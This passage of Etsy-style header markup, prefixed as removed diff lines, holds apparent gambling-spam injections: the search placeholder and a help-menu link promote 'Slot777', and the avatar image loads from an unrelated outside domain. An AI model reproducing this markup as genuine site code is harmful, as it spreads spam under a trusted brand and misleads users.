-          Categories
-        </button>
-
-        <div data-neu-spec-placeholder="1" id="bd2c69bf978c5288825b3623782eb9a1">
-    <script type="text/json" data-neu-spec-placeholder-data="1">{"spec_name":"Etsy\\Modules\\CategoryNav\\Specs\\DropdownCatNav\\DropdownSubmenu","args":[]}</script>
-    <div>
-    
-        
-</div>
-</div>
-
-        <span class="ge-menu__body-caret wt-z-index-10 wt-bg-white wt-position-absolute wt-bl-xs wt-bt-xs wt-br-xs-none wt-bb-xs-none"></span>
-
-</div>
-            </nav>
-
-        <div class="wt-width-full wt-display-flex-xs wt-pr-lg-3 wt-flex-lg-1 order-mobile-tablet-2" data-hamburger-search-container>
-            <button
-          data-id="hamburger"
-          class="wt-btn wt-btn--transparent wt-btn--icon wt-hide-lg
-               wt-btn--transparent-flush-left
-                         wt-mb-xs-2
-               
-               wt-mb-lg-0
-               header-button"
-          aria-controls="mobile-catnav-overlay"
-          tab-index="0"
-     >
-          <span class="wt-screen-reader-only">
-                    Browse
-          </span>
-          <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M21 7H3V5h18zm-5 6H3v-2h13zm5 6H3v-2h18z"/></svg></span>
-     </button>
-            <div class="wt-display-inline-block wt-flex-xs-1 wt-pl-lg-0
-                wt-mb-xs-2
-        
-        wt-mb-lg-0">
-    <form id="gnav-search"
-          class="global-enhancements-search-nav wt-position-relative wt-display-flex-xs"
-          method="GET"
-          action="/search.php"
-          role="search"
-          data-gnav-search
-          data-ge-search-clearable
-          data-trending-searches="1">
-
-        <label for="global-enhancements-search-query" class="wt-label wt-screen-reader-only">
-   Search for items or shops
-</label>
-<div 
-    class="search-container"
-    data-id="search-bar"
->
-    <div
-        class="wt-input-btn-group global-enhancements-search-input-btn-group emphasized_search_bar emphasized_search_bar_grey_bg search-bar-container"
-        data-id="search-suggestions-trigger"
-    >
-        <input id="global-enhancements-search-query"
-            data-id="search-query"
-            data-search-input
-            type="text"
-            name="search_query"
-            class="wt-input wt-input-btn-group__input global-enhancements-search-input-btn-group__input
-                    wt-pr-xs-7
-                                        
-                    "
-            placeholder="Cari Kami Di Google 'Slot777'"
-            value=""
-            autocomplete="off"
-            autocorrect="off"
-            autocapitalize="off"
-            role="combobox"
-            aria-autocomplete="both"
-            aria-controls="global-enhancements-search-suggestions"
-            aria-expanded="false"
-        />
-        <button type="button" class="wt-btn wt-btn--transparent wt-btn--icon wt-btn--small position-absolute-important wt-position-right wt-z-index-9 wt-animated  wt-animated--is-hidden
-            
-            search-close-btn-margin-right " data-search-close-btn>
-            <span class="wt-screen-reader-only">Clear search</span>
-            <span class="wt-icon wt-icon--smaller wt-nudge-t-1"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13.414,12l6.293-6.293a1,1,0,0,0-1.414-1.414L12,10.586,5.707,4.293A1,1,0,0,0,4.293,5.707L10.586,12,4.293,18.293a1,1,0,1,0,1.414,1.414L12,13.414l6.293,6.293a1,1,0,0,0,1.414-1.414Z"/></svg></span>
-        </button>
-        <button
-            type="submit"
-            class="wt-input-btn-group__btn global-enhancements-search-input-btn-group__btn
-                
-                "
-            value="Search"
-            aria-label="Search"
-        data-id="gnav-search-submit-button">
-            
-            <span class="wt-icon wt-nudge-b-2 wt-nudge-r-1"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.5 19a8.46 8.46 0 0 0 5.262-1.824l4.865 4.864 1.414-1.414-4.865-4.865A8.5 8.5 0 1 0 10.5 19m0-2a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13"/></svg></span>
-        </button>
-    </div>
-    <div id="global-enhancements-search-suggestions"
-        class="global-nav-menu__body
-            search-suggestions-container
-             wt-width-full wt-max-width-full
-            "
-         data-id="search-suggestions">
-    </div>
-</div>
-
-<input id="search-js-router-enabled" type="hidden" value="true" />
-<input type="hidden" value="all" name="search_type" id="search-type" />
-    </form>
-</div>
-        </div>
-
-        <a 
-    data-selector="skip-to-content-marketplace"
-    class="global-enhancements-skip-to-content wt-screen-reader-only wt-focusable" 
-    href="#content"
->
-    <div id="skip-to-content-wrapper" class="wt-display-flex-xs wt-align-items-center wt-justify-content-center wt-body-max-width wt-width-full wt-height-full wt-position-absolute wt-position-top wt-position-left wt-position-right wt-bg-denim wt-z-index-10">
-        <label class="wt-btn wt-btn--transparent wt-btn--light">
-            Skip to Content
-        </label>
-    </div>
-</a>
-
-        
-
-        <div
-            class="mobile-catnav-wrapper wt-overlay wt-overlay--peek wt-overlay--peek-left wt-p-xs-0"
-            data-wt-overlay
-            id="mobile-catnav-overlay"
-            aria-hidden="true"
-            aria-modal="false"
-            role="dialog"
-            
-        >
-        </div>
-
-        <div class="wt-flex-shrink-xs-0" data-primary-nav-container>
-            <nav aria-label="Main">
-    <ul class="wt-display-flex-xs wt-justify-content-space-between wt-list-unstyled wt-m-xs-0 wt-align-items-center">
-        <li 
-    data-favorites-nav-container 
-    data-ge-nav-menu="favorites"
-    data-ge-hover-event-name="gnav_hover_favorites_menu"
->
-
-</li>
-
-
-
-
-<li>
-<div data-clg-id="WtMenu" class="wt-menu wt-tooltip ge-menu ge-menu--body-below-trigger ge-menu--help wt-tooltip--disabled-touch" data-wt-menu data-wt-tooltip="true" data-ge-nav-menu="help" data-ge-nav-event-name="gnav_show_help_menu" data-ge-hover-event-name="gnav_hover_help_menu" data-menu-body-below-trigger="true" data-hide-trigger-on-open="false" data-animate-in="true" data-close-on-select="true" data-contain-focus="false" data-open-direction-vert="bottom" data-open-direction-horiz="right" data-open-direction-force="true" data-menu-type="action">
-    <button data-clg-id="WtMenuTrigger" type="button" class="wt-menu__trigger wt-btn wt-btn--transparent wt-tooltip__trigger help-menu-trigger wt-btn--icon wt-pr-xs-1 wt-display-inline-flex-xs reduced-margin-xs header-button" aria-haspopup="true" aria-expanded="false" data-wt-menu-trigger aria-describedby="ge-tooltip-label-help" aria-label="Help &amp; Support" data-overlay-trigger-selector="overlay-trigger-ele">
-        <span class="wt-menu__trigger__label">            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M12 22a10 10 0 1 1 10-10 10.013 10.013 0 0 1-10 10m0-18a8 8 0 1 0 8 8 8.01 8.01 0 0 0-8-8"/><path d="M12 18a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3m1-4h-2a3.04 3.04 0 0 1 1.7-2.379c.8-.566 1.3-.947 1.3-1.621a2 2 0 1 0-4 0H8a4 4 0 1 1 8 0 4 4 0 0 1-2.152 3.259c-.33.186-.62.438-.848.741"/></svg></span>
-</span>
-        <span class="wt-icon wt-menu__trigger__caret"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><polygon points="16.5 10 12 16 7.5 10 16.5 10"/></svg></span>
-</button>
-        <span id="ge-tooltip-label-help" role="tooltip">Help & Support</span>
-
-<div data-clg-id="WtMenuBody" role="menu" class="wt-menu__body ge-help-menu-dimensions wt-display-flex-xs wt-flex-direction-column-xs wt-pb-xs-2" data-wt-menu-body >
-                <ul class="wt-list-unstyled">
-                <li class="wt-sem-text-primary wt-list-unstyled">
-    <h4 class="wt-text-title-01 wt-mt-xs-1" aria-label="Help & Support">Help & Support</h4>
-</li><li class="wt-sem-text-primary wt-list-unstyled wt-pt-xs-1 wt-pb-xs-1">
-    <div class="wt-bt-xs"></div>
-</li><div class="wt-mt-xs-3 wt-mb-xs-3 wt-mr-xs-3 wt-ml-xs-3">
-    <p class="wt-text-body-small">
-        Reach out to the seller first for help with an existing order. If you ever need us, Etsy has your back.
-    </p>
-</div>
-    <button
-        tabindex="0"
-        class="wt-btn wt-btn--transparent wt-btn--small wt-mb-xs-3"
-         data-selector="help_menu_cta_button"
-    >
-        Go to Purchases
-        <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="m18.414 12-5.707 5.707-1.414-1.414L14.586 13H6v-2h8.586l-3.293-3.293 1.414-1.414z"/></svg></span>
-    </button><li class="wt-sem-text-primary wt-list-unstyled wt-pt-xs-1 wt-pb-xs-1">
-    <div class="wt-bt-xs"></div>
-</li><div class="wt-pt-xs-3">
-</div><li class="wt-sem-text-primary wt-list-unstyled">
-    <a 
-        role="menuitem" 
-        href="https://www.etsy.com/etsy-purchase-protection?ref=hdr_help_menu" 
-        class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" 
-            target="_blank"
-    >
-        <div>
-            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 36 37" fill="none" aria-hidden="true" focusable="false">
-<path d="M18.24 7.37659C21.615 5.26159 26.205 5.95159 29.175 8.90659C32.76 12.4916 32.76 18.2816 29.175 21.8666L25.935 25.1066" fill="#4D6BC6"/>
-<path d="M26.7449 25.9015L25.1249 24.2815L28.3649 21.0415C31.4849 17.9215 31.4849 12.8365 28.3649 9.70152C25.7549 7.09152 21.7499 6.52152 18.8549 8.33652L17.6399 6.40152C21.4349 4.01652 26.6249 4.73652 29.9849 8.09652C34.0049 12.1165 34.0049 18.6565 29.9849 22.6765L26.7449 25.9165V25.9015Z" fill="#222222"/>
-<path d="M30.0601 19.1965L26.4601 15.5965L19.7701 8.90652C16.1851 5.32152 10.3951 5.32152 6.81009 8.90652C3.22509 12.4915 3.22509 18.2815 6.81009 21.8665L11.4301 26.4865L14.6701 29.7265C15.5701 30.6265 17.0101 30.6265 17.9101 29.7265C18.8101 28.8265 18.8101 27.3865 17.9101 26.4865L16.6201 25.1965L19.5301 28.1065C20.4301 29.0065 21.8701 29.0065 22.7701 28.1065C23.6701 27.2065 23.6701 25.7665 22.7701 24.8665L23.5801 25.6765C24.4801 26.5765 25.9201 26.5765 26.8201 25.6765C27.7201 24.7765 27.7201 23.3365 26.8201 22.4365L23.1751 18.7915L26.8201 22.4365C27.7201 23.3365 29.1601 23.3365 30.0601 22.4365C30.9601 21.5365 30.9601 20.0965 30.0601 19.1965Z" fill="#D7E6F5"/>
-<path d="M12.495 29.1414L6.015 22.6614C1.995 18.6414 1.995 12.1014 6.015 8.08141C10.035 4.06141 16.575 4.06141 20.595 8.08141L27.285 14.7714L25.665 16.3914L18.975 9.70141C15.855 6.58141 10.77 6.58141 7.635 9.70141C4.515 12.8214 4.515 17.9064 7.635 21.0414L14.115 27.5214L12.495 29.1414Z" fill="#222222"/>
-<path d="M16.2901 31.5266C15.4051 31.5266 14.5351 31.1966 13.8601 30.5216L10.6201 27.2816L12.2401 25.6616L15.4801 28.9016C15.9301 29.3516 16.6501 29.3516 17.1001 28.9016C17.5501 28.4516 17.5501 27.7316 17.1001 27.2816L13.8601 24.0416L15.4801 22.4216L18.7201 25.6616C20.0551 26.9966 20.0551 29.1866 18.7201 30.5216C18.0451 31.1966 17.1751 31.5266 16.2901 31.5266Z" fill="#222222"/>
-<path d="M21.1501 29.9064C20.2651 29.9064 19.3951 29.5764 18.7201 28.9014L13.8601 24.0414L15.4801 22.4214L20.3401 27.2814C20.7901 27.7314 21.5101 27.7314 21.9601 27.2814C22.4101 26.8314 22.4101 26.1114 21.9601 25.6614L17.1001 20.8014L18.7201 19.1814L23.5801 24.0414C24.9151 25.3764 24.9151 27.5664 23.5801 28.9014C22.9051 29.5764 22.0351 29.9064 21.1501 29.9064Z" fill="#222222"/>
-<path d="M25.2001 27.4915C24.2851 27.4915 23.4151 27.1315 22.7701 26.4865L17.1001 20.8165L18.7201 19.1965L24.3901 24.8665C24.8401 25.3165 25.5601 25.3165 26.0101 24.8665C26.4601 24.4165 26.4601 23.6965 26.0101 23.2465L20.3401 17.5765L21.9601 15.9565L27.6301 21.6265C28.9651 22.9615 28.9651 25.1515 27.6301 26.4865C26.9851 27.1315 26.1151 27.4915 25.2001 27.4915Z" fill="#222222"/>
-<path d="M28.4401 24.2516C27.5251 24.2516 26.6551 23.8916 26.0101 23.2466L20.3401 17.5766L21.9601 15.9566L27.6301 21.6266C28.0651 22.0616 28.8151 22.0616 29.2501 21.6266C29.4751 21.4166 29.5801 21.1166 29.5801 20.8166C29.5801 20.5166 29.4601 20.2166 29.2501 20.0066L23.5801 14.3366L25.2001 12.7166L30.8701 18.3866C31.5151 19.0316 31.8751 19.9016 31.8751 20.8166C31.8751 21.7316 31.5151 22.6016 30.8701 23.2466C30.2251 23.8916 29.3551 24.2516 28.4401 24.2516Z" fill="#222222"/>
-<path d="M24.2851 10.2415L17.2651 15.1615C15.9601 16.0765 14.1751 15.7615 13.2601 14.4565C12.3601 13.1665 12.6601 11.3815 13.9501 10.4665C15.4801 9.38647 17.4601 7.93147 18.0901 7.54147C21.4651 5.42647 26.2201 5.95147 29.1751 8.90647" fill="#4D6BC6"/>
-<path d="M14.6101 11.3815L16.0351 10.3615C16.7701 9.83645 17.5201 9.31145 18.0601 8.92145C18.3301 8.72645 18.5551 8.57645 18.7051 8.48645C19.2001 8.17145 19.7251 7.96145 20.2801 7.78145C23.0251 6.88145 26.2651 7.57145 28.3801 9.70145L30.0001 8.08145C26.8801 4.96145 21.8701 4.21145 18.0751 6.22145C17.8801 6.32645 17.6851 6.43145 17.4901 6.55145C17.1601 6.76145 16.5151 7.21145 15.7651 7.75145C15.4351 7.99145 15.0751 8.24645 14.7151 8.50145L13.2901 9.52145C11.4901 10.7965 11.0551 13.3015 12.3301 15.1015C12.9451 15.9865 13.8751 16.5715 14.9251 16.7515C15.1651 16.7965 15.3901 16.8115 15.6301 16.8115C16.4551 16.8115 17.2501 16.5565 17.9251 16.0765L22.3051 13.0165L24.2101 11.6815L22.5601 10.0315L20.6551 11.3665L16.6051 14.2015C16.2301 14.4715 15.7651 14.5615 15.3151 14.4865C14.8651 14.4115 14.4601 14.1565 14.2051 13.7815C13.6651 13.0015 13.8451 11.9215 14.6251 11.3815H14.6101Z" fill="#222222"/>
-</svg></span>
-        </div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Slot777</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled" data-selector="help_menu_hc_link">
-    <a 
-        role="menuitem" 
-        href="https://www.etsy.com/help" 
-        class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" 
-            target="_blank"
-    >
-        <div>
-            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" focusable="false"><path d="M12,22A10,10,0,1,1,22,12,10.012,10.012,0,0,1,12,22ZM12,4a8,8,0,1,0,8,8A8.009,8.009,0,0,0,12,4Z"/><circle cx="12" cy="16.5" r="1.5"/><path d="M13,14H11a3.043,3.043,0,0,1,1.7-2.379C13.5,11.055,14,10.674,14,10a2,2,0,1,0-4,0H8a4,4,0,1,1,8,0,4,4,0,0,1-2.152,3.259A2.751,2.751,0,0,0,13,14Z"/></svg></span>
-        </div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Help Centre</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled" data-selector="help_menu_contact_link">
-    <a 
-        role="menuitem" 
-        href="https://www.etsy.com/help/contact" 
-        class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" 
-            target="_blank"
-    >
-        <div>
-            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" focusable="false"><path d="M21 3H3a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8.65l4.73 3.78a1 1 0 0 0 1.4-.15A1 1 0 0 0 18 20v-3h3a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1zm-1 12.05h-4V18l-3.38-2.71a.92.92 0 0 0-.62-.22H4V5h16zM8 11a1 1 0 1 0-1-1 1 1 0 0 0 1 1zm4 0a1 1 0 1 0-1-1 1 1 0 0 0 1 1zm4 0a1 1 0 1 0-1-1 1 1 0 0 0 1 1z"/></svg></span>
-        </div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Contact Etsy Support</p>
-        </div>
-    </a>
-</li><div class="wt-pb-xs-2">
-</div>
-            </ul>
-
-</div>
-        <span class="ge-menu__body-caret wt-z-index-10 wt-bg-white wt-position-absolute wt-bl-xs wt-bt-xs"></span>
-
-</div></li>
-<li data-user-nav-container >
-<div data-clg-id="WtMenu" class="wt-menu wt-tooltip ge-menu ge-menu--body-below-trigger ge-menu--you-menu wt-tooltip--disabled-touch" data-wt-menu data-wt-tooltip="true" data-ge-nav-menu="user" data-ge-nav-event-name="gnav_show_user_menu" data-ge-hover-event-name="gnav_hover_user_menu" data-menu-body-below-trigger="true" data-hide-trigger-on-open="false" data-animate-in="true" data-close-on-select="true" data-contain-focus="false" data-open-direction-vert="bottom" data-open-direction-horiz="right" data-open-direction-force="true" data-menu-type="action">
-    
-        <button data-clg-id="WtMenuTrigger" type="button" class="wt-menu__trigger wt-btn wt-btn--transparent wt-tooltip__trigger wt-btn--icon wt-pr-xs-1 wt-display-inline-flex-xs reduced-margin-xs header-button ge-menu--you-menu" aria-haspopup="true" aria-expanded="false" data-wt-menu-trigger aria-describedby="ge-tooltip-label-you-menu" aria-label="You with 0 notifications" data-selector="you-menu-tooltip">
-        <span class="wt-menu__trigger__label">    <img
-    data-clg-id="WtImage"
-    class="gnav-user-avatar wt-circle wt-overflow-hidden wt-icon wt-image--cover wt-image"
-    src="https://aduhhenakmasssini.space/hubton/favicon.png"
-    alt="Lizza Hamudi's avatar"
-    style="aspect-ratio: 1;"
-    
-    
-    
-/>
-    <span class="wt-badge wt-badge--notificationPrimary wt-badge--small wt-badge--outset-top-right wt-z-index-1 wt-no-wrap ge-menu-count-badge
-          wt-display-none"
-          aria-hidden="true"
-          data-notification="you-menu">
-        0
-    </span>
-</span>
-        <span class="wt-icon wt-menu__trigger__caret"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><polygon points="16.5 10 12 16 7.5 10 16.5 10"/></svg></span>
-</button>
-        <span id="ge-tooltip-label-you-menu" role="tooltip">Your account</span>
-
-<div data-clg-id="WtMenuBody" role="menu" class="wt-menu__body wt-pt-xs-2 wt-pb-xs-2 ge-you-menu-dimensions wt-z-index-10" data-wt-menu-body >
-                <ul class="wt-list-unstyled">
-                <li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/people/r6cailhwo6qt62hc?ref=hdr_user_menu-profile" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1">
-        <div><img
-    data-clg-id="WtImage"
-    class="gnav-user-avatar wt-circle wt-overflow-hidden wt-icon wt-image--cover wt-image"
-    src="https://aduhhenakmasssini.space/hubton/favicon.png"
-    alt="Lizza Hamudi's avatar"
-    style="aspect-ratio: 1;"
-    
-    
-    
-/></div>
-        <span class="wt-ml-xs-2 wt-flex-grow-xs-1">
-            <h4 class="wt-text-title-01 wt-m-xs-0" aria-label="View your profile">Lizza Hamudi</h4>
-            <p class="wt-text-caption wt-m-xs-0" aria-hidden="true">View your profile</p>
-        </span>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled wt-pt-xs-1 wt-pb-xs-1">
-    <div class="wt-bt-xs"></div>
-</li><li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/your/purchases?ref=hdr_user_menu-txs" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1"  target="_blank">
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M16.5,12h-9a0.5,0.5,0,0,1,0-1h9A0.5,0.5,0,0,1,16.5,12Z"/><path d="M15.5,15h-8a0.5,0.5,0,0,1,0-1h8A0.5,0.5,0,0,1,15.5,15Z"/><path d="M13.5,18h-6a0.5,0.5,0,0,1,0-1h6A0.5,0.5,0,1,1,13.5,18Z"/><path d="M20,3H15.859A3.982,3.982,0,0,0,8.141,3H4A1,1,0,0,0,3,4V21a1,1,0,0,0,1,1H20a1,1,0,0,0,1-1V4A1,1,0,0,0,20,3ZM10,5h0.277A1.979,1.979,0,0,1,10,4a2,2,0,0,1,4,0,1.979,1.979,0,0,1-.277,1H14a2,2,0,0,1,2,2H8A2,2,0,0,1,10,5Zm9,15H5V5H6.54A3.972,3.972,0,0,0,6,7V9H18V7a3.972,3.972,0,0,0-.54-2H19V20Z"/><circle cx="12" cy="3.5" r="0.5"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Purchases and reviews</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/messages?ref=hdr_user_menu-messages" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" aria-label="Messages with 0 notifications" target="_blank">
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M21 3H3a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8.65l4.73 3.78a1 1 0 0 0 1.4-.15A1 1 0 0 0 18 20v-3h3a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1zm-1 12.05h-4V18l-3.38-2.71a.92.92 0 0 0-.62-.22H4V5h16zM8 11a1 1 0 1 0-1-1 1 1 0 0 0 1 1zm4 0a1 1 0 1 0-1-1 1 1 0 0 0 1 1zm4 0a1 1 0 1 0-1-1 1 1 0 0 0 1 1z"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" aria-hidden="true">
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Messages</p>
-                <span data-notification="messages" class="wt-display-none wt-badge wt-badge--notificationPrimary wt-badge--small wt-nudge-b-1 wt-ml-xs-1">0</span>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled wt-pt-xs-1 wt-pb-xs-1">
-    <div class="wt-bt-xs"></div>
-</li><li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/offers?ref=hdr_user_menu-coupons" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1"  target="_blank">
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M11,22a1,1,0,0,1-.707-0.293l-8-8a1,1,0,0,1,0-1.414l10-10A1,1,0,0,1,13,2h8a1,1,0,0,1,1,1v8a1,1,0,0,1-.293.707l-10,10A1,1,0,0,1,11,22ZM4.414,13L11,19.586l9-9V4H13.414Z"/><circle cx="16" cy="8" r="2"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Special offers</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled" data-selector="data-registry-menu-link">
-    <a role="menuitem" href="https://www.etsy.com/registry?ref=hdr_user_menu-registry" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" >
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M9 15a1 1 0 1 0 0-2 1 1 0 0 0 0 2m1 2a1 1 0 1 1-2 0 1 1 0 0 1 2 0m1-2.25h5v-1.5h-5zm5 3h-5v-1.5h5z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M18 4.5c0 .537-.12 1.045-.337 1.5H20v16H4V6h2.337A3.5 3.5 0 0 1 12 2.05a3.5 3.5 0 0 1 6 2.45m-2 0A1.5 1.5 0 0 1 14.5 6H13V4.5a1.5 1.5 0 0 1 3 0M8 9a3 3 0 0 0 2.236-1H6v12h12V8h-4.236c.55.614 1.348 1 2.236 1v2a5 5 0 0 1-4-2 5 5 0 0 1-4 2zm1.5-6A1.5 1.5 0 0 1 11 4.5V6H9.5a1.5 1.5 0 1 1 0-3"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Etsy Registry</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/sell?ref=hdr-sell&from_page=https%3A%2F%2Fwww.etsy.com%2Flisting%2F1790774795%2Fbook-club-print-bookish-poster-trendy" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" >
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 9a3.333 3.333 0 0 0 6.667.023A3.333 3.333 0 0 0 15.334 9 3.333 3.333 0 0 0 22 9l-5-7H7zm13.334 0H4.458l3.571-5h7.942l3.571 5zM18 13h2v9H4v-9h2v2h12zm0 4H6v3h12z"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Sell on Etsy</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled wt-pt-xs-1 wt-pb-xs-1">
-    <div class="wt-bt-xs"></div>
-</li><li class="wt-sem-text-primary wt-list-unstyled" data-selector="hc_link_profile_dropdown">
-    <a role="menuitem" href="https://www.etsy.com/help?ref=hdr_user_menu-hc_link" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1"  target="_blank">
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M12 22a10 10 0 1 1 10-10 10.013 10.013 0 0 1-10 10m0-18a8 8 0 1 0 8 8 8.01 8.01 0 0 0-8-8"/><path d="M12 18a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3m1-4h-2a3.04 3.04 0 0 1 1.7-2.379c.8-.566 1.3-.947 1.3-1.621a2 2 0 1 0-4 0H8a4 4 0 1 1 8 0 4 4 0 0 1-2.152 3.259c-.33.186-.62.438-.848.741"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Help Centre</p>
-        </div>
-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/your/account?ref=hdr_user_menu-settings" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1"  target="_blank">
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M19 12.3v-.6l.9-.9c.3-.3.5-.7.6-1.2.1-.4 0-.9-.2-1.3l-1-1.7c-.2-.4-.6-.7-1-.9-.4-.2-.9-.2-1.3-.1l-1.2.3c-.2-.1-.4-.2-.5-.3L15 4.4c-.1-.4-.4-.8-.7-1.1-.4-.1-.9-.3-1.3-.3h-2c-.4 0-.9.2-1.2.4-.4.3-.6.7-.7 1.1l-.4 1.2c-.1.1-.3.2-.5.4L7 5.7c-.4-.1-.9-.1-1.3.1s-.8.5-1 .9l-1 1.7c-.2.4-.3.8-.2 1.2.1.4.3.9.6 1.2l.9.9v.6l-1 .9c-.3.3-.5.7-.6 1.2s0 .9.2 1.3l1 1.7c.2.3.4.6.7.7.5.3 1 .3 1.6.2l1.2-.3c.2.1.4.2.5.3l.4 1.2c.1.4.4.8.7 1.1.4.3.8.4 1.2.4h2c.4 0 .9-.2 1.2-.4.4-.3.6-.7.7-1.1l.3-1.2c.2-.1.4-.2.5-.3l1.2.3c.2 0 .4.1.5.1.4 0 .7-.1 1-.3.3-.2.6-.4.7-.7l1-1.7c.2-.4.3-.8.3-1.3-.1-.4-.3-.8-.6-1.2l-.7-.9zm-2-1.4l.1.5v1.1l-.1.6 1.6 1.6-1 1.7-2.2-.6-.4.2c-.3.2-.7.4-1 .6l-.5.2L13 19h-2l-.5-2.2-.5-.2c-.4-.2-.7-.4-1-.6l-.4-.3-2.2.6-1-1.7L7 13.1v-.5V10.9L5.4 9.4l1-1.7 2.2.6L9 8c.3-.2.7-.4 1-.6l.5-.2L11 5h2l.5 2.2.5.2c.4.2.7.4 1 .6l.4.3 2.2-.6 1 1.7-1.6 1.5z"/><path d="M12 9c-1.7 0-3 1.4-3 3s1.4 3 3 3 3-1.4 3-3-1.3-3-3-3zm0 4c-.6 0-1-.5-1-1s.5-1 1-1 1 .5 1 1-.4 1-1 1z"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Account settings</p>
-        </div>
